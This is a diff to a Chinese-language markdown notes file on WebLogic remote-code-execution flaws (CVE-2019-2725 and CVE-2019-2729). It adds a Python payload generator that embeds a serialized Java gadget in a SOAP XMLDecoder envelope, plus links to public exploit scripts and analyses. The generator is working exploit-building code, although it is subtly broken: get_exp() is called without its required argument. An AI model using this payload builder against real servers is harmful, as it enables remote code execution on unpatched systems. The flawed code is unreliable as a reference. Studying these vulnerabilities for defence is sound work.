@@ -71,6 +71,36 @@ poc:
 payload生成参考：
 - [
 WebLogic wls9-async组件RCE分析（CVE-2019-2725）](https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/)
+或者python版：
+```py
+# 来源：https://github.com/iceMatcha/CNTA-2019-0014xCVE-2019-2725/blob/master/weblogic_rce.py
+def get_exp(file):
+    _payload = open(file, 'rb').read()
+    _payload = bytearray(_payload)
+    payloads = ""
+    payloads += '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>'''
+    payloads += f'\n<array class="byte" length="{len(_payload)}">'
+    for i, v in enumerate(_payload):
+        if v > 128:
+            payloads += f'\n<void index="{i}"><byte>{v-256}</byte></void>'
+        else:
+            payloads += f'\n<void index="{i}"><byte>{v}</byte></void>'
+    payloads += '''
+</array>
+</void></class>
+</java>
+</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
+    return payloads
+
+in_file = "C:\\Users\\Administrator\\Desktop\\weblogic_Jdk7u21_calc.ser"
+out_file = "C:\\Users\\Administrator\\Desktop\\weblogic_Jdk7u21_calc_payload2.txt"
+
+exp = get_exp()
+
+with open(out_file, 'w') as f:
+    f.write(exp)
+```
 
 
 ### CVE-2019-2729_v10_UnitOfWorkChangeSet_with_echo
@@ -157,3 +187,15 @@ poc（加载自定义类）:
 - [Weblogic-CVE-2019-2725-通杀payload](http://www.lmxspace.com/2019/05/15/Weblogic-CVE-2019-2725-%E9%80%9A%E6%9D%80payload/)
 - [WebLogic wls9-async组件RCE分析（CVE-2019-2725）](https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/)
 - [CNTA-2019-0014 wls9-async 反序列化 rce 分析](https://www.cnblogs.com/afanti/p/10792982.html)
+- [weblogic-2019-2725exp回显构造](https://xz.aliyun.com/t/5299)
+- [Oracle WebLogic wls9-async CVE-2019-2725](https://kibodwapon.github.io/2019/05/24/Oracle-WebLogic-wls9-async-CVE-2019-2725/)
+- [XMLDecoder解析流程分析](https://paper.seebug.org/916/)
+- [WebLogic RCE(CVE-2019-2725)漏洞之旅](https://paper.seebug.org/909/)
+- [浅谈Weblogic反序列化——XMLDecoder的绕过史](https://www.anquanke.com/post/id/180725)
+- [java反序列化RCE回显研究](https://xz.aliyun.com/t/5257)
+- [cve-2019-2729 weblogic 12.1.3版本分析](https://www.buaq.net/go-20897.html)
+- [weblogic wls9-async组件rce漏洞分析](https://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi)
+- https://github.com/pimps/CVE-2019-2725/blob/master/weblogic_exploit.py
+- https://github.com/iceMatcha/CNTA-2019-0014xCVE-2019-2725/blob/master/weblogic_rce.py
+- https://github.com/starnightcyber/VEF/blob/ebbdeed2556d56fd0a59796f72c8643f277a5151/scripts/weblogic-cve-2019-2729.py
+- https://docs.oracle.com/cd/E17802_01/products/products/jfc/tsc/articles/persistence2/beanbox_Folder.1/docs/javadoc/java/beans/XMLEncoder.html
